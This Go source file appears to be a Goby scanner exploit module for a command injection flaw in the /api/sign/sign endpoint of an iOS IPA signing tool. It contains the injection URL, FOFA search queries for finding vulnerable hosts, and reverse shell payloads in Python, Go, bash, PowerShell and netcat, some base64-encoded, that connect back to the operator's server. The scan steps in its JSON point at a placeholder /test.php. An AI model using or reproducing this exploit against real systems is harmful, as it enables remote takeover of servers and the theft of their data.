package exploits

import (
  "encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
  expJson := `{
    "Name": "Apple iOS IPA Signing Tool /api/sign/sign Command Execution Vulnerability",
    "Description": "<p>The /api/sign/sign interface of the Apple iOS IPA Signing Tool has a command execution vulnerability, allowing attackers to execute arbitrary commands on the system, potentially leading to full system compromise.</p>",
    "Product": "Apple iOS IPA Signing Tool",
    "Homepage": "https://gitee.com/BiggerMax/superSign",
    "DisclosureDate": "2024-11-08",
    "PostTime": "2024-11-15",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"/assets/index/css/mobileSelect.css\" && body=\"/assets/index/css/mobileSelect.js\"",
    "GobyQuery": "body=\"/assets/index/css/mobileSelect.css\" && body=\"/assets/index/css/mobileSelect.js\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands on the system, potentially leading to full system compromise and severe security risks.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://gitee.com/BiggerMax/superSign\">https://gitee.com/BiggerMax/superSign</a></p><p>2.It is recommended to immediately fix this vulnerability, restrict access to the /api/sign/sign interface, and perform strict validation and filtering of inputs.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7Sign.php%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "苹果IOS端IPA签名工具 /api/sign/sign 命令执行漏洞",
            "Product": "苹果IOS端IPA签名工具",
            "Description": "<p>苹果IOS端IPA签名工具的/api/sign/sign接口存在任意命令执行漏洞，攻击者可以通过该漏洞在系统上执行任意命令，从而可能导致系统被完全控制。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本</p><p><a href=\"https://gitee.com/BiggerMax/superSign\">https://gitee.com/BiggerMax/superSign</a><br></p><p>2、建议立即修复该漏洞，限制/api/sign/sign接口的访问权限，并对输入进行严格的验证和过滤。</p>",
            "Impact": "<p>攻击者可以利用该漏洞在系统上执行任意命令，可能导致系统被完全控制，造成严重的安全隐患。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Apple iOS IPA Signing Tool /api/sign/sign Command Execution Vulnerability",
            "Product": "Apple iOS IPA Signing Tool",
            "Description": "<p>The /api/sign/sign interface of the Apple iOS IPA Signing Tool has a command execution vulnerability, allowing attackers to execute arbitrary commands on the system, potentially leading to full system compromise.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://gitee.com/BiggerMax/superSign\">https://gitee.com/BiggerMax/superSign</a><br></p><p>2.It is recommended to immediately fix this vulnerability, restrict access to the /api/sign/sign interface, and perform strict validation and filtering of inputs.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands on the system, potentially leading to full system compromise and severe security risks.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`
  
setPayloadRequestHashzsBjquOv := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
	//command为原始命令，如果需编码，请自行编码后使用
	//漏洞url地址
	vulPath := "/api/sign/sign"
	encode_command := strings.ReplaceAll(command, " ", "%20")
	urlGet := vulPath + `?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|` + encode_command + `>2.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1`
	getRequestConfig := httpclient.NewGetRequestConfig(urlGet)
	getRequestConfig.VerifyTls = false
	getRequestConfig.FollowRedirect = false
	// 请求头
	head := map[string]string{
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36`,
	}
	for headName, headValue := range head {
		getRequestConfig.Header.Store(headName, headValue)
	}
	//请求
	response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	if err != nil || response == nil {
		return "", "", err
	}
	regStr := `"msg":"([^-]+)-`
	regObj := regexp.MustCompile(regStr)
	if !regObj.MatchString(response.RawBody) {
		return "", "", errors.New("RCE Fail")
	}
	getname := regObj.FindStringSubmatch(response.RawBody)
  getname[1] = strings.ReplaceAll(getname[1], "sh: ", "")
	if getname[1] == "" {
		regStr1 := `command not found\\n([^"]+)"` 
		regObj1 := regexp.MustCompile(regStr1)
    if !regObj1.MatchString(response.RawBody) {
      return "", "", errors.New("RCE Fail")
    }
		getname = regObj1.FindStringSubmatch(response.RawBody)
	}
	//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
  
	commandResult := strings.ReplaceAll(getname[1], "\\n", "\n")
	return commandResult, vulPath, nil
}

ExpManager.AddExploit(NewExploit(
	goutils.GetFileName(),
	expJson,
	//poc验证函数
	func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
		runPayload := setPayloadRequestHashzsBjquOv

		text := goutils.RandomHexString(16)
		pocCommand := `echo ` + text
		pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
		if err != nil {
			return false
		}
		if strings.Contains(pocRuselt, text) {
			ss.VulURL = hostInfo.FixedHostInfo + pocUrl
			return true
		}
		return false
	},
	//exp利用函数
	func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
		runPayload := setPayloadRequestHashzsBjquOv

		setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
			select {
			case webConsleID := <-waitSessionCh:
				if u, err := url.Parse(webConsleID); err == nil {
					expResult.Success = true
					expResult.OutputType = "html"
					sid := strings.Join(u.Query()["id"], "")
					expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
				} else {
					expResult.Success = false
					expResult.Output = "reverse shell fail"
				}
			case <-time.After(time.Second * 25):
			}
		}

		setReverseRequest := func(reverseType string) (string, chan string, error) {
			ReverseTcpByPython := func(rp string) string {
				return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
			}
			ReverseTcpByGo := func(rp string) string {
				return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
			}
			typeList := map[string]func(string) string{
				"ByBash":             godclient.ReverseTCPByBash,
				"ByBashBase64":       godclient.ReverseTCPByBash,
				"ByPowershell":       godclient.ReverseTCPByPowershell,
				"ByPowershellBase64": godclient.ReverseTCPByPowershell,
				"BySh":               godclient.ReverseTCPBySh,
				"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				"ByPython":           ReverseTcpByPython,
				"ByGo":               ReverseTcpByGo,
			}
			if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
				return "", nil, errors.New("vaild exsploit")
			}
			waitSessionCh := make(chan string)

			if strings.Contains(reverseType, "ByPowershell") {
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
					command := typeList[reverseType](rp)
					if reverseType == "ByPowershellBase64" {
						utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
						bytes := make([]byte, len(utf16Bytes)*2)
						for i, v := range utf16Bytes {
							bytes[i*2] = byte(v)
							bytes[i*2+1] = byte(v >> 8)
						}
						command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
					}
					return command, waitSessionCh, nil
				}
			} else {
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
					command := typeList[reverseType](rp)
					if reverseType == "ByBashBase64" {
						command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
					}
					return command, waitSessionCh, nil
				}
			}
			return "", waitSessionCh, errors.New("gain command fail")
		}

		attackType := goutils.B2S(ss.Params["attackType"])
		switch attackType {
		case "cmd":
			//配置命令
			command := goutils.B2S(ss.Params["cmd"])
			Result, _, err := runPayload(expResult.HostInfo, command)

			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			if len(Result) > 0 {
				expResult.Success = true
				expResult.Output = Result
			} else {
				expResult.Success = false
				expResult.Output = err.Error()
			}
		case "reverse":
			//配置反弹shell的类型
			reversetype := goutils.B2S(ss.Params["reverse"])

			if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
				go runPayload(expResult.HostInfo, command)
				setReverseWaitting(expResult, waitSessionCh)
			} else {
				expResult.Success = false
				expResult.Output = err.Error()
			}
		default:
			expResult.Success = false
			expResult.Output = `未知的利用方式`
		}
		return expResult
	},
))
}
